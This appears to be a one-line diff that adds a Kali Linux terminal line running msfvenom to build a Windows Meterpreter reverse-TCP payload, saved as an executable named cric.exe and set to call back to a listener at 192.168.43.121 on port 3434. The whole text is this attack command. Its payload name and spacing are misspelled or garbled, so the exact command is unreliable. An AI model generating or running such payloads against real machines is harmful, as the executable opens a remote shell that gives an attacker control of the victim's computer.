@@ -1,0 +1,1 @@
+root@kali:-# msfvenom -p windowsx64/meteroreter/reverse_tcp LHOST =192.168.43.121 LPORT=3434 -f exe -o cric.exe
